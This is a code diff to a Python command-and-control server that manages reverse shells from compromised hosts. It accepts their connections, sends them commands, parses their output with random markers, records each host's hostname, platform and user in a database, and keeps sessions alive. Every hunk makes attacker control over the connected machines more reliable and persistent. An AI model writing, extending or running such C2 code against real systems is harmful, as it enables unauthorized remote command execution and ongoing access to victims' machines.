@@ -32,6 +32,16 @@ class ShellConnection:
                 if not self.is_active:
                     return "Error: Connection is not active"
                 
+                # Drain any buffered data (e.g. from keepalive prompts)
+                self.conn.settimeout(0.2)
+                try:
+                    while True:
+                        leftover = self.conn.recv(4096)
+                        if not leftover:
+                            break
+                except (socket.timeout, OSError):
+                    pass
+                
                 # Send command
                 self.conn.settimeout(timeout)
                 cmd_bytes = (command.strip() + '\n').encode('utf-8')
@@ -209,25 +219,45 @@ class ShellListener:
                     shell_user = ""
                     default_hostname = f"host-{ip}"
                     
-                    # Use unique markers to extract clean output
-                    marker_start = "C2_START_MARKER"
-                    marker_end = "C2_END_MARKER"
+                    # Use unique random markers to extract clean output
+                    marker_id = secrets.token_hex(4)
+                    marker_start = f"C2S{marker_id}"
+                    marker_end = f"C2E{marker_id}"
                     
                     def _extract_output(raw: str, marker_s: str, marker_e: str) -> str:
                         """Extract output between markers, falling back to cleaning."""
-                        if marker_s in raw and marker_e in raw:
-                            start = raw.index(marker_s) + len(marker_s)
-                            end = raw.index(marker_e)
-                            return raw[start:end].strip()
+                        # Use rfind to skip the echoed command line and find
+                        # the actual marker output lines.
+                        s_idx = raw.rfind(marker_s)
+                        e_idx = raw.rfind(marker_e)
+                        if s_idx >= 0 and e_idx > s_idx:
+                            extracted = raw[s_idx + len(marker_s):e_idx].strip()
+                            # The extracted text may still contain echoed commands
+                            # or prompt fragments. Keep only clean result lines.
+                            lines = [l.strip() for l in extracted.split('\n') if l.strip()]
+                            clean = []
+                            for line in lines:
+                                if marker_s in line or marker_e in line:
+                                    continue
+                                clean.append(line)
+                            return clean[0] if clean else ""
                         # Fallback: clean the raw output
                         cleaned = clean_shell_output(raw).strip()
-                        # Remove lines that look like the command itself
                         lines = [l for l in cleaned.split('\n') if l.strip()]
-                        # Return last non-empty line (usually the output)
                         return lines[-1].strip() if lines else ""
                     
                     def _send_and_recv(cmd_str: str) -> str:
                         """Send a command and receive output."""
+                        # Drain any leftover data first
+                        conn.settimeout(0.2)
+                        try:
+                            while True:
+                                d = conn.recv(4096)
+                                if not d:
+                                    break
+                        except (socket.timeout, OSError):
+                            pass
+                        
                         conn.sendall(cmd_str.encode('utf-8'))
                         time.sleep(0.5)
                         chunks = b""
@@ -276,8 +306,10 @@ class ShellListener:
                     platform = "Unknown"
                     shell_user = "unknown"
                 
-                # Create or update shell record
-                shell = ReverseShell.query.filter_by(address=ip, port=port).first()
+                # Create or update shell record – match by IP address only
+                # so that reconnections from the same host (which arrive on
+                # a different source port) reuse the existing record.
+                shell = ReverseShell.query.filter_by(address=ip).first()
                 if not shell:
                     session_id = secrets.token_urlsafe(16)
                     shell = ReverseShell(
@@ -294,17 +326,20 @@ class ShellListener:
                     )
                     db.session.add(shell)
                 else:
-                    # Generate new session_id if not exists
+                    # Reuse existing record – update port and metadata
+                    shell.port = port
                     if not shell.session_id:
                         shell.session_id = secrets.token_urlsafe(16)
                     shell.status = "connected"
+                    shell.disconnected_at = None
                     shell.connected_at = datetime.utcnow()
                     shell.last_seen = datetime.utcnow()
-                    if hostname:
+                    if hostname and hostname != default_hostname:
                         shell.hostname = hostname
-                    if platform:
+                        shell.name = hostname
+                    if platform and platform != 'Unknown':
                         shell.platform = platform
-                    if shell_user:
+                    if shell_user and shell_user != "unknown":
                         shell.shell_user = shell_user
                 
                 db.session.commit()
@@ -319,9 +354,21 @@ class ShellListener:
                 # Keep connection alive
                 while self.is_running and self.connections.get(shell_id):
                     try:
-                        # Send keepalive
+                        # Use a no-op comment command for keepalive instead
+                        # of bare newlines which pollute the shell buffer.
                         conn.settimeout(30)
-                        conn.sendall(b'\n')
+                        conn.sendall(b'# keepalive\n')
+                        # Drain the keepalive response so it doesn't
+                        # bleed into the next real command.
+                        time.sleep(0.3)
+                        conn.settimeout(0.5)
+                        try:
+                            while True:
+                                d = conn.recv(4096)
+                                if not d:
+                                    break
+                        except (socket.timeout, OSError):
+                            pass
                         time.sleep(30)
                         
                         # Update last_seen
